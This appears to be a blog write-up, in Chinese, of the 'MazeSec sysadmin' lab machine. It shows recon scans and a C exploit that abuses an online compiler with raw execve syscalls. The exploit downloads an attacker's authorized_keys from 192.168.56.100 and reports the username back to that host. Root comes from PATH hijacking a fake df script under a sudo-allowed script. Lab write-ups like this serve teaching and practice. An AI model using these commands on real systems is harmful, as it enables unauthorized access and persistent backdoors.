@@ -1,0 +1,221 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>the0n3 - MazeSec sysadmin</title>
+        <meta name="description" content="the0n3">
+            <link rel="canonical" href="https://blog.the0n3.top">
+        <script>
+        (function () {
+            try {
+                var key = 'theme';
+                var saved = localStorage.getItem(key);
+                var theme = (saved === 'dark' || saved === 'light') ? saved : 'light';
+                document.documentElement.setAttribute('data-theme', theme);
+                document.documentElement.style.colorScheme = theme;
+            } catch (e) {
+                document.documentElement.setAttribute('data-theme', 'light');
+                document.documentElement.style.colorScheme = 'light';
+            }
+        })();
+    </script>
+    <!-- 使用 GitHub Markdown 样式 -->
+    <link rel="stylesheet" href="/assets/css/github-markdown.css">
+    <link rel="stylesheet" href="/assets/css/site.css">
+            <link rel="stylesheet" href="/assets/css/reading-progress.css">
+            <link rel="stylesheet" href="/assets/css/image-enhance.css">
+        <link rel="stylesheet" href="/assets/css/nav-reveal.css">
+    <!-- 代码高亮样式 -->
+    <link rel="stylesheet" href="/assets/prism/prism.css">
+</head>
+<body>
+        <div class="reading-progress" aria-hidden="true">
+        <div class="reading-progress__bar"></div>
+    </div>
+        <header>
+        <nav>
+            <div class="nav-right">
+                <a href="/">首页</a>
+                <a href="/archives">归档</a>
+                <a href="/categories">分类</a>
+                <a href="/tags">标签</a>
+            </div>
+        </nav>
+    </header>
+                <div class="page-layout">
+            <main class="markdown-body">
+                
+<article class="post-content">
+    <h1>MazeSec sysadmin</h1>
+    <p>
+        <span class="meta">发布于: 2025-11-05 07:44</span>
+    </p>
+    <div class="post-body">
+        <h2>信息收集</h2>
+<p>存活主机扫描</p>
+<pre><code class="language-bash">┌──(npc㉿kali)-[~]
+└─$ sudo arp-scan -I eth1 192.168.56.0/24
+
+192.168.56.210  08:00:27:4d:99:9d       (Unknown)</code></pre>
+<p>端口扫描</p>
+<pre><code class="language-bash">┌──(npc㉿kali)-[~]
+└─$ nmap -sT -p- 192.168.56.210
+
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http</code></pre>
+<p>访问80端口，允许上传c文件，在线编译运行，注释里有编译的指令</p>
+<p><img src="/images/maze-sysadmin/1.png" alt="" /></p>
+<h2>echo用户登录</h2>
+<h3>内核函数 execve 调用</h3>
+<p>禁用了标准库头文件 (-nostdinc)，包含文件头的c文件会编译失败</p>
+<pre><code class="language-bash">gcc -std=c11 -nostdinc -I/var/www/include -z execstack -fno-stack-protector -no-pie test.c -o a.out</code></pre>
+<p>学习夜老师的exp</p>
+<p>靶机会在家目录创建<code>.ssh</code>目录，下载提供的公钥，公钥权限控制仅自己可读写，最后告诉攻击机当前系统用户名</p>
+<p>exp.c</p>
+<pre><code class="language-c">// 声明syscall函数
+long syscall(long num, long p1, long p2, long p3);
+
+int main() {
+    char *sh = "/bin/bash";
+    char *arg1 = "bash";
+    char *arg2 = "-c";
+    char *cmd = "mkdir -p ~/.ssh &amp;&amp; busybox wget http://192.168.56.100/authorized_keys -O ~/.ssh/authorized_keys &amp;&amp; chmod 700 ~/.ssh &amp;&amp; chmod 600 ~/.ssh/authorized_keys &amp;&amp; busybox wget http://192.168.56.100/`whoami`";
+
+    // 定位内核 系统调用号 59
+    const long SYS_EXECVE = 59;
+
+
+    char *argv[] = {arg1, arg2, cmd, 0};
+    // 执行execve函数系统调用
+    syscall(SYS_EXECVE, (long)sh, (long)argv, 0);
+
+    while(1) {
+        syscall(37, 0, 0, 0);
+    }
+
+    return 0;
+}
+
+long syscall(long num, long p1, long p2, long p3) {
+    long ret;
+    // 使用内联汇编实现系统调用，编
+    __asm__ volatile (
+        "movq %1, %%rax\n"
+        "movq %2, %%rdi\n"
+        "movq %3, %%rsi\n"
+        "movq %4, %%rdx\n"
+        "syscall\n"
+        "movq %%rax, %0\n"
+        : "=m"(ret)
+        : "m"(num), "m"(p1), "m"(p2), "m"(p3)
+        : "rax", "rdi", "rsi", "rdx"
+    );
+    return ret;
+}</code></pre>
+<p>上传编译，成功执行命令，用户名<code>echo</code></p>
+<p><img src="/images/maze-sysadmin/2.png" alt="" /></p>
+<p>ssh私钥登录echo用户</p>
+<pre><code class="language-bash">ssh echo@192.168.56.210 -i pentest</code></pre>
+<h2>root 提权</h2>
+<h3>sudo权限枚举</h3>
+<p>ssh登录echo用户，查找可用sudo命令</p>
+<p>sudo -l提示<code>!env_reset</code>，说明echo用户在执行sudo命令时，环境变量不会重置为sudo用户的环境变量，这会导致PATH变量劫持</p>
+<pre><code class="language-bash">echo@Sysadmin:~$ sudo -l
+Matching Defaults entries for echo on Sysadmin:
+    !env_reset, mail_badpass, !env_reset, always_set_home
+
+User echo may run the following commands on Sysadmin:
+    (root) NOPASSWD: /usr/local/bin/system-info.sh</code></pre>
+<p><img src="/images/maze-sysadmin/3.png" alt="" /></p>
+<h3>PATH劫持提权</h3>
+<p>查看脚本内容，里面使用的命令没有使用绝对路径，存在PATH劫持漏洞</p>
+<pre><code class="language-bash">echo@Sysadmin:~$ cat /usr/local/bin/system-info.sh 
+#!/bin/bash
+
+#===================================
+# Daily System Info Report
+#===================================
+
+echo "Starting daily system information collection at $(date)"
+echo "------------------------------------------------------"
+
+echo "Checking disk usage..."
+df -h
+
+echo "Checking log directory..."
+ls -lh /var/log/
+find /var/log/ -type f -name "*.gz" -mtime +30 -exec rm {} \;
+
+echo "Checking critical services..."
+systemctl is-active sshd
+systemctl is-active cron
+
+echo "Collecting CPU and memory information..."
+cat /proc/cpuinfo
+free -m
+
+echo "------------------------------------------------------"
+echo "Report complete at $(date)"</code></pre>
+<p>df、ls、find、cat、free等命令都可以被劫持，date,echo属于内置shell命令，不适合劫持</p>
+<p>下面以第一个出现的<code>df</code>命令演示</p>
+<p>攻击步骤：</p>
+<ol>
+<li>在可控目录（可读可写）<code>/tmp</code>下创建一个恶意脚本<code>df</code>，授予执行权限</li>
+</ol>
+<pre><code class="language-bash">echo@Sysadmin:/tmp$ echo -e '#!/bin/bash\n/bin/bash' &gt; df
+echo@Sysadmin:/tmp$ cat df
+#!/bin/bash
+/bin/bash
+echo@Sysadmin:/tmp$ chmod +x df</code></pre>
+<ol start="2">
+<li>修改PATH环境变量，将<code>/tmp</code>目录添加到PATH变量的最前面，确保最先找到<code>/tmp</code>目录下的df脚本</li>
+</ol>
+<pre><code class="language-bash">echo@Sysadmin:/tmp$ echo $PATH
+/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
+echo@Sysadmin:/tmp$ export PATH=/tmp:$PATH
+echo@Sysadmin:/tmp$ echo $PATH
+/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games</code></pre>
+<ol start="3">
+<li>执行sudo命令，触发system-info.sh脚本，执行恶意df脚本，获取root shell</li>
+</ol>
+<pre><code class="language-bash">echo@Sysadmin:/tmp$ sudo /usr/local/bin/system-info.sh
+Starting daily system information collection at Tue 04 Nov 2025 11:57:22 AM EST
+------------------------------------------------------
+Checking disk usage...
+root@Sysadmin:/tmp# cat /root/root.txt
+flag{root-8b8a8b353298f798e3eb8628661617b6}
+root@Sysadmin:/tmp# cat /home/echo/user.txt
+flag{user-9592f6e02a7abaf9e38c0ef43e868cf3}
+root@Sysadmin:/tmp# </code></pre>    </div>
+        <div class="post-meta-footer">
+                    <span class="post-meta-item">分类:
+                                    <span>渗透</span>
+                            </span>
+                            <span class="post-meta-item">标签:
+                                    <span>#syscall</span>
+                                    <span>#PATH劫持</span>
+                            </span>
+            </div>
+    </article>
+
+            </main>
+                <aside class="post-toc" aria-label="Table of contents">
+        <div class="toc-title">目录</div>
+        <nav class="toc-list"></nav>
+    </aside>
+            </div>
+        <button id="backToTop" class="fab fab-top" type="button" aria-label="返回顶部" title="返回顶部">↑</button>
+    <button id="themeToggle" class="theme-toggle" type="button" aria-label="切换主题" title="切换主题"></button>
+    <script src="/assets/js/site.js"></script>
+        <script src="/assets/js/navReveal.js"></script>
+        <script src="/assets/js/readingProgress.js"></script>
+            <script src="/assets/js/imageEnhance.js"></script>
+        <!-- 启动代码高亮及行号显示 -->
+    <script src="/assets/prism/prism.js"></script>
+    <script src="/assets/prism/prism-line-number.js"></script>
+    <!-- 主题切换 -->
+    <script src="/assets/js/ThemeSwitch.js"></script>
+</body>
+</html>
